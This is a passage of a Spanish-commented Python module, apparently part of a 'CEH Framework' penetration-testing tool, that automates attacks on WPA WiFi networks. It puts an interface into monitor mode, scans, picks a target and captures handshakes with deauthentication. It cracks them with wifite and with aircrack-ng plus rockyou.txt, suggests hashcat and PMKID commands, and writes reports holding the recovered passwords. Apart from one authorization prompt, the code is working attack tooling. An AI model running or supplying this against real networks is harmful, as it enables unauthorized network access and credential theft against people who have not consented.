                        if network.bssid.lower() in text.lower() or network.essid in text:
                            import json as _json
                            try:
                                data = _json.loads(text)
                                if isinstance(data, list):
                                    for entry in data:
                                        if isinstance(entry, dict):
                                            pw = entry.get("key") or entry.get("password") or entry.get("psk")
                                            if pw:
                                                password = pw
                                                break
                            except Exception:
                                m = re.search(r'"key"\s*:\s*"([^"]+)"', text)
                                if m:
                                    password = m.group(1)
                    except Exception:
                        pass

        # Extraer ruta del .cap que guardó wifite (aunque no crackee)
        # Wifite guarda en: hs/handshake_ESSID_BSSID_DATE.cap
        wifite_cap = None
        # Capturar ruta del .cap de wifite — dos posibles formatos:
        # "saving copy of handshake to hs/..."  (captura nueva)
        # "Using handshake from hs/..."         (reutilizando existente)
        cap_patterns = [
            r"saving copy of handshake to (\S+\.cap)",
            r"[Uu]sing handshake from (\S+\.cap)",
            r"handshake.*?[:\s]+(\S+\.cap)",
        ]
        for pat in cap_patterns:
            cap_match = re.search(pat, full_output, re.IGNORECASE)
            if cap_match:
                wifite_cap = cap_match.group(1).strip()
                break

        if wifite_cap and not Path(wifite_cap).is_absolute():
            for base in [Path.cwd(), Path("/root"), Path.home(),
                         Path("/root/hs"), Path.home() / "hs"]:
                candidate = base / wifite_cap
                if candidate.exists():
                    wifite_cap = str(candidate)
                    break
                # Intentar solo el filename
                candidate2 = base / Path(wifite_cap).name
                if candidate2.exists():
                    wifite_cap = str(candidate2)
                    break

        if wifite_cap and Path(wifite_cap).exists():
            print_success(f"Handshake de wifite: [bold]{wifite_cap}[/bold]")
        else:
            wifite_cap = None

        # cracked = SOLO si encontramos contraseña real (no depender del returncode)
        cracked = bool(password)
        if not cracked and proc.returncode != 0:
            print_warning(f"Wifite terminó sin contraseña (código {proc.returncode}).")
        return cracked, password, wifite_cap   # retornar también el .cap capturado

    except KeyboardInterrupt:
        # Al interrumpir, buscar si wifite ya había capturado un handshake
        wifite_cap = None
        if Path(wifite_log).exists():
            try:
                log_text = Path(wifite_log).read_text()
                for pat in [
                    r"saving copy of handshake to (\S+\.cap)",
                    r"[Uu]sing handshake from (\S+\.cap)",
                    r"handshake.*?[:\s]+(\S+\.cap)",
                ]:
                    cap_match = re.search(pat, log_text, re.IGNORECASE)
                    if cap_match:
                        raw = cap_match.group(1).strip()
                        for base in [Path.cwd(), Path("/root"), Path.home(),
                                     Path("/root/hs"), Path.home() / "hs"]:
                            full = base / raw if not Path(raw).is_absolute() else Path(raw)
                            if full.exists():
                                wifite_cap = str(full)
                                break
                            full2 = base / Path(raw).name
                            if full2.exists():
                                wifite_cap = str(full2)
                                break
                        if wifite_cap:
                            print_info(f"Wifite ya tenía handshake: [bold]{wifite_cap}[/bold]")
                            break
            except Exception:
                pass
        print_warning("\nWifite interrumpido por el usuario.")
        return False, "", wifite_cap
    except subprocess.TimeoutExpired:
        print_warning("Wifite alcanzó el timeout.")
        return False, "", None


def _attack_aircrack(mon_iface: str, network: WifiNetwork,
                     rockyou_path: str,
                     existing_cap: str | None = None) -> tuple[bool, str]:
    """
    Método manual robusto:
    1. Usa existing_cap si wifite ya capturó el handshake (evita recaptura)
    2. Si no hay .cap previo, captura con airodump-ng + deauth
    3. Crackea con aircrack-ng + rockyou
    Retorna (cracked: bool, password: str).
    """
    console.print(Rule(
        "[bold red][ Ataque 2/2 ] AIRCRACK-NG — Handshake + Diccionario[/bold red]",
        style="red"
    ))

    # Usar handshake ya capturado por wifite si existe
    if existing_cap and Path(existing_cap).exists():
        print_success(
            f"Usando handshake ya capturado por wifite:\n"
            f"  [bold]{existing_cap}[/bold]"
        )
        print_info("Saltando fase de captura.")
        cap_file = existing_cap
    else:
        # Captura nueva
        cap_time = int(Prompt.ask(
            "  Tiempo de captura de handshake (segundos)",
            default="60"
        ))
        cap_file = _capture_handshake(mon_iface, network, cap_time)
        if not cap_file:
            return False, ""

    # Guardar captura en reports
    from core.utils import REPORTS_DIR
    import shutil as _shutil
    dest_cap = f"{REPORTS_DIR}/handshake_{network.bssid.replace(':', '-')}.cap"
    try:
        _shutil.copy2(cap_file, dest_cap)
        print_info(f"Captura guardada en: [bold]{dest_cap}[/bold]")
    except Exception:
        pass

    separator()
    # Verificar que el .cap tiene handshake WPA real antes de gastar tiempo en crackeo
    print_info("Verificando handshake en el archivo de captura...")
    chk_out, _, _ = run_command(["aircrack-ng", cap_file], timeout=15)

    has_handshake = (
        "1 handshake" in chk_out.lower()
        or "wpa" in chk_out.lower()
        or network.bssid.lower() in chk_out.lower()
    )

    if not has_handshake:
        console.print(Panel(
            "[bold red]✗ El archivo .cap no contiene un handshake WPA válido.[/bold red]\n\n"
            "  Posibles causas:\n"
            "  • No había clientes conectados durante la captura\n"
            "  • El tiempo de captura fue muy corto\n"
            "  • Los paquetes deauth no forzaron reconexión\n\n"
            "  [bold]Solución:[/bold] Vuelve a ejecutar el módulo con más tiempo de captura\n"
            "  o espera a que un cliente se conecte/reconecte naturalmente.",
            border_style="red", box=box.ROUNDED,
        ))
        return False, ""

    print_success("Handshake WPA confirmado en el .cap.")
    print_info(f"Iniciando crackeo con [bold]aircrack-ng[/bold] + [bold]rockyou.txt[/bold]")
    print_info(f"Diccionario: [bold]{rockyou_path}[/bold]")
    print_warning("Este proceso puede tardar mucho tiempo según la complejidad de la contraseña.\n")

    cmd = SUDO_PREFIX + [
        "aircrack-ng",
        "-w", rockyou_path,
        "-b", network.bssid,
        cap_file,
    ]
    print_info(f"Ejecutando: [bold]{' '.join(cmd)}[/bold]\n")

    aircrack_log = f"{CAPTURE_DIR}/aircrack_output.txt"
    password = ""

    try:
        with open(aircrack_log, "w") as log_f:
            proc = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
            )
            output_lines = []
            for line in proc.stdout:
                print(line, end="", flush=True)
                log_f.write(line)
                output_lines.append(line)
            proc.wait()

        full_output = "".join(output_lines)

        # Extraer contraseña — aircrack-ng muestra:
        # "KEY FOUND! [ la_contraseña ]"
        m = re.search(r"KEY FOUND!\s*\[\s*(.+?)\s*\]", full_output)
        if m:
            password = m.group(1).strip()

        # cracked = SOLO si aircrack encontró "KEY FOUND!" en el output
        cracked = bool(password)

        if cracked:
            print_success(f"[bold green]¡CONTRASEÑA ENCONTRADA:[/bold green] [bold yellow]{password}[/bold yellow]")
        else:
            print_warning("Contraseña no encontrada en rockyou.txt.")
            _suggest_alternatives(network)

        return cracked, password

    except KeyboardInterrupt:
        print_warning("\nCrackeo interrumpido.")
        return False, ""


def _suggest_alternatives(network: WifiNetwork):
    """Sugiere herramientas alternativas cuando rockyou falla."""
    console.print(Panel(
        "[bold yellow]Sugerencias para continuar:[/bold yellow]\n\n"
        "  [bold]1. Diccionario personalizado:[/bold]\n"
        "     [cyan]aircrack-ng -w /ruta/diccionario.txt "
        f"-b {network.bssid} /tmp/ceh_wifi/handshake_*.cap[/cyan]\n\n"
        "  [bold]2. Hashcat (GPU — más rápido):[/bold]\n"
        "     Convierte el .cap:\n"
        "     [cyan]hcxpcapngtool -o hash.hc22000 /tmp/ceh_wifi/handshake_*.cap[/cyan]\n"
        "     Crackea:\n"
        "     [cyan]hashcat -m 22000 hash.hc22000 rockyou.txt[/cyan]\n\n"
        "  [bold]3. Ataque PMKID (sin clientes):[/bold]\n"
        "     [cyan]hcxdumptool -i <iface_monitor> -o pmkid.pcapng[/cyan]\n"
        "     [cyan]hcxpcapngtool -o hash.hc22000 pmkid.pcapng[/cyan]",
        border_style="yellow",
        box=box.ROUNDED,
    ))


# ─── Entrypoint principal ─────────────────────────────────────────────────────

def run_wifi_audit():
    """
    Punto de entrada del módulo WiFi.
    Flujo completo: interfaz → monitor → escaneo → selección → ataque.
    """
    console.print("\n[bold cyan]╔══ MÓDULO: AUDITORÍA WIFI ══╗[/bold cyan]")
    separator()

    # ── 0. Verificar root ─────────────────────────────────────────────────────
    if not require_root("Auditoría WiFi"):
        return

    # ── 1. Verificar herramientas ─────────────────────────────────────────────
    console.print(Rule("[bold cyan][ 1/6 ] Verificando Herramientas[/bold cyan]", style="cyan"))
    tools = _check_wifi_tools()
    _show_tool_status(tools)

    missing = [t for t, ok in tools.items() if not ok]
    if missing:
        if Confirm.ask(f"\n  Faltan {len(missing)} herramientas. ¿Instalar ahora?", default=True):
            _install_missing_tools(tools)
            tools = _check_wifi_tools()
            if not check_tool("airmon-ng") or not check_tool("airodump-ng"):
                print_error("No se pudieron instalar las herramientas esenciales.")
                return

    # ── 2. Detectar interfaces WiFi ───────────────────────────────────────────
    console.print()
    console.print(Rule("[bold cyan][ 2/6 ] Detectando Interfaces WiFi[/bold cyan]", style="cyan"))

    interfaces = _get_wifi_interfaces()
    if not interfaces:
        print_error("No se detectaron interfaces WiFi.")
        print_info("Verifica que tu adaptador esté conectado con: [bold]iw dev[/bold]")
        return

    # Mostrar interfaces disponibles
    iface_table = Table(box=box.ROUNDED, border_style="cyan")
    iface_table.add_column("#",        style="bold yellow", width=5,  justify="center")
    iface_table.add_column("Interfaz", style="bold white",  width=12)
    iface_table.add_column("MAC",      style="dim white",   width=20)
    iface_table.add_column("Driver",   style="cyan",        width=18)
    iface_table.add_column("Chipset",  style="dim",         width=30)
    iface_table.add_column("Modo",     style="green",       width=10)

    for i, iface in enumerate(interfaces, 1):
        mode_tag = (
            "[bold green]monitor[/bold green]" if iface.mode == "monitor"
            else "[dim]managed[/dim]"
        )
        iface_table.add_row(
            str(i),
            iface.name,
            iface.mac or "—",
            iface.driver or "—",
            iface.chipset[:30] or "—",
            mode_tag,
        )
    console.print(iface_table)

    # Seleccionar interfaz
    choice = Prompt.ask(
        "\n[bold yellow]  Selecciona interfaz WiFi[/bold yellow]",
        choices=[str(i) for i in range(1, len(interfaces) + 1)],
        default="1"
    )
    selected_iface = interfaces[int(choice) - 1]
    print_info(f"Interfaz seleccionada: [bold]{selected_iface.name}[/bold]")

    # ── 3. Verificar soporte de monitor mode ──────────────────────────────────
    console.print()
    console.print(Rule("[bold cyan][ 3/6 ] Verificando Capacidades[/bold cyan]", style="cyan"))

    print_info(f"Verificando soporte de monitor mode para [bold]{selected_iface.name}[/bold]...")
    supports_mon = _check_monitor_support(selected_iface)

    if supports_mon:
        print_success("La interfaz soporta modo monitor.")
    else:
        print_warning("No se pudo confirmar soporte de monitor mode por software.")
        print_warning("Intentando de todas formas — algunos drivers no reportan correctamente.")
        if not Confirm.ask("  ¿Continuar de todas formas?", default=True):
            return

    # ── 4. Activar modo monitor ───────────────────────────────────────────────
    console.print()
    console.print(Rule("[bold cyan][ 4/6 ] Activando Modo Monitor[/bold cyan]", style="cyan"))

    mon_iface = _enable_monitor_mode(selected_iface)
    if not mon_iface:
        print_error("No se pudo activar el modo monitor.")
        return

    print_success(f"Modo monitor activo: [bold]{mon_iface}[/bold]")

    # Test de inyección opcional
    if Confirm.ask("\n  ¿Ejecutar test de inyección de paquetes?", default=True):
        print_info("Probando inyección...")
        inj = _check_injection_support(mon_iface)
        if inj:
            print_success("Inyección de paquetes funcional.")
        else:
            print_warning("Test de inyección fallido — los ataques de deauth pueden no funcionar.")

    # ── 5. Escanear redes ─────────────────────────────────────────────────────
    console.print()
    console.print(Rule("[bold cyan][ 5/6 ] Escaneando Redes[/bold cyan]", style="cyan"))

    scan_time = int(Prompt.ask(
        "  Tiempo de escaneo (segundos)",
        default="20"
    ))

    try:
        networks = _scan_networks(mon_iface, scan_time)
    except KeyboardInterrupt:
        networks = []

    if not networks:
        print_error("No se detectaron redes.")
        _disable_monitor_mode(mon_iface, selected_iface.name)
        return

    console.print()
    _render_networks_table(networks)

    # Filtrar solo redes con encriptación (no atacar redes abiertas sin permiso explícito)
    attackable = [n for n in networks if n.enc.upper() not in ("", "—")]

    # Seleccionar red objetivo
    console.print()
    target_idx = Prompt.ask(
        f"[bold yellow]  Selecciona red objetivo[/bold yellow] (1-{len(networks)})",
        default="1"
    )
    try:
        target_net = networks[int(target_idx) - 1]
    except (ValueError, IndexError):
        print_error("Selección inválida.")
        _disable_monitor_mode(mon_iface, selected_iface.name)
        return

    console.print(Panel(
        f"[bold cyan]Red objetivo:[/bold cyan]  {target_net.essid}\n"
        f"[bold cyan]BSSID:[/bold cyan]         {target_net.bssid}\n"
        f"[bold cyan]Canal:[/bold cyan]         {target_net.channel}\n"
        f"[bold cyan]Encriptación:[/bold cyan] {target_net.enc} / {target_net.cipher}\n"
        f"[bold cyan]Clientes:[/bold cyan]      {target_net.clients}",
        title="[bold red]⚠ OBJETIVO SELECCIONADO[/bold red]",
        border_style="red",
        box=box.ROUNDED,
    ))

    if not Confirm.ask(
        "\n  [bold red]¿Confirmas que tienes autorización para atacar esta red?[/bold red]",
        default=False
    ):
        print_warning("Operación cancelada.")
        _disable_monitor_mode(mon_iface, selected_iface.name)
        return

    # ── 6. Ataque ─────────────────────────────────────────────────────────────
    console.print()
    console.print(Rule("[bold red][ 6/6 ] Fase de Ataque[/bold red]", style="red"))

    # Obtener rockyou
    rockyou = _get_rockyou()

    cracked  = False
    password = ""
    method_used = "ninguno"

    # Método 1: wifite
    wifite_cap = None
    if check_tool("wifite"):
        cracked, password, wifite_cap = _attack_wifite(mon_iface, target_net)
        if cracked:
            method_used = "wifite"
    else:
        print_warning("wifite no disponible — saltando al método manual.")

    # Método 2: aircrack-ng + rockyou (si wifite no crackeó)
    if not cracked:
        separator()
        rockyou_path = rockyou
        if not rockyou_path:
            rockyou_path = Prompt.ask(
                "  Ingresa ruta a un diccionario alternativo (o Enter para omitir)",
                default=""
            )
        if rockyou_path and Path(rockyou_path).exists():
            print_info("Iniciando método manual con aircrack-ng...")
            # Si wifite ya capturó un handshake, usarlo directamente
            cracked, password = _attack_aircrack(
                mon_iface, target_net, rockyou_path,
                existing_cap=wifite_cap   # puede ser None → captura nueva
            )
            if cracked:
                method_used = "aircrack-ng + rockyou"
        elif not rockyou_path:
            print_error("Sin diccionario disponible para el método manual.")

    # ── Reporte final completo ─────────────────────────────────────────────────
    from datetime import datetime as _dt
    from core.utils import REPORTS_DIR as _REPORTS_DIR
    import shutil as _shutil

    timestamp = _dt.now().strftime("%Y%m%d_%H%M%S")
    safe_essid = re.sub(r"[^\w\-]", "_", target_net.essid)

    report_lines = [
        "=" * 60,
        "  CEH FRAMEWORK — REPORTE AUDITORÍA WIFI",
        "=" * 60,
        f"Fecha/Hora  : {_dt.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"",
        f"[ RED OBJETIVO ]",
        f"  ESSID       : {target_net.essid}",
        f"  BSSID       : {target_net.bssid}",
        f"  Canal       : {target_net.channel}",
        f"  Encriptación: {target_net.enc} / {target_net.cipher}",
        f"  Auth        : {target_net.auth}",
        f"  Clientes    : {target_net.clients}",
        f"  Señal       : {target_net.power} dBm",
        f"",
        f"[ ATAQUE ]",
        f"  Interfaz    : {mon_iface}",
        f"  Método      : {method_used}",
        f"  Diccionario : {rockyou or 'N/A'}",
        f"",
        f"[ RESULTADO ]",
    ]

    if cracked and password:
        report_lines += [
            f"  Estado      : VULNERADA ✔",
            f"  CONTRASEÑA  : {password}",
            f"",
            f"  *** INFORMACIÓN CONFIDENCIAL — USO AUTORIZADO ÚNICAMENTE ***",
        ]
    elif cracked:
        report_lines += [
            f"  Estado      : VULNERADA ✔ (contraseña en output de la herramienta)",
        ]
    else:
        report_lines += [
            f"  Estado      : No vulnerada",
            f"  Nota        : Contraseña no encontrada con los métodos y diccionario usados.",
        ]

    # Copiar archivos de captura al directorio reports/
    report_lines.append("")
    report_lines.append("[ ARCHIVOS GUARDADOS ]")

    for src_glob, desc in [
        (f"{CAPTURE_DIR}/wifite_output.txt",       "Log wifite"),
        (f"{CAPTURE_DIR}/aircrack_output.txt",      "Log aircrack-ng"),
        (f"{CAPTURE_DIR}/handshake_*.cap",          "Captura handshake"),
    ]:
        import glob as _glob
        matches = _glob.glob(src_glob)
        for src in matches:
            fname   = Path(src).name
            dest    = f"{_REPORTS_DIR}/wifi_{safe_essid}_{timestamp}_{fname}"
            try:
                _shutil.copy2(src, dest)
                report_lines.append(f"  {desc}: {dest}")
            except Exception as e:
                report_lines.append(f"  {desc}: ERROR copiando ({e})")

    report_lines.append("=" * 60)
    report_content_full = "\n".join(report_lines)

    # Guardar reporte principal
    report_file = f"{_REPORTS_DIR}/wifi_audit_{safe_essid}_{timestamp}.txt"
    try:
        with open(report_file, "w") as rf:
            rf.write(report_content_full)
        print_info(f"Reporte guardado en: [bold]{report_file}[/bold]")
    except Exception as e:
        print_error(f"No se pudo guardar el reporte: {e}")
        save_report(target_net.bssid, "wifi_audit", report_content_full)

    # ── Mostrar resultado final en pantalla ────────────────────────────────────
    separator()
    if cracked and password:
        console.print(Panel(
            f"[bold green]✔ RED VULNERADA EXITOSAMENTE[/bold green]\n\n"
            f"  [bold cyan]ESSID      :[/bold cyan] {target_net.essid}\n"
            f"  [bold cyan]BSSID      :[/bold cyan] {target_net.bssid}\n"
            f"  [bold cyan]CONTRASEÑA :[/bold cyan] [bold yellow]{password}[/bold yellow]\n"
            f"  [bold cyan]Método     :[/bold cyan] {method_used}\n\n"
            f"  [dim]Reporte completo: {report_file}[/dim]",
            border_style="green",
            box=box.DOUBLE_EDGE,
            title="[bold green]🔑 CREDENCIALES[/bold green]",
        ))
    elif cracked:
        console.print(Panel(
            f"[bold green]✔ RED VULNERADA[/bold green]\n\n"
            f"  Contraseña visible en el log de la herramienta.\n"
            f"  [dim]Log: {_REPORTS_DIR}/wifi_{safe_essid}_{timestamp}_*[/dim]\n"
            f"  [dim]Reporte: {report_file}[/dim]",
            border_style="green", box=box.DOUBLE_EDGE,
        ))
    else:
        console.print(Panel(
            f"[bold yellow]⚠ No se pudo vulnerar la red[/bold yellow]\n\n"
            f"  Contraseña no encontrada con los métodos usados.\n"
            f"  [dim]Reporte guardado: {report_file}[/dim]",
            border_style="yellow", box=box.ROUNDED,
        ))

    # ── Restaurar interfaz ────────────────────────────────────────────────────
    separator()
    if Confirm.ask("\n  ¿Restaurar interfaz a modo managed?", default=True):
        _disable_monitor_mode(mon_iface, selected_iface.name)
        print_success("Interfaz restaurada. NetworkManager reiniciado.")

    console.print("\n[bold green]✔ Auditoría WiFi finalizada.[/bold green]\n")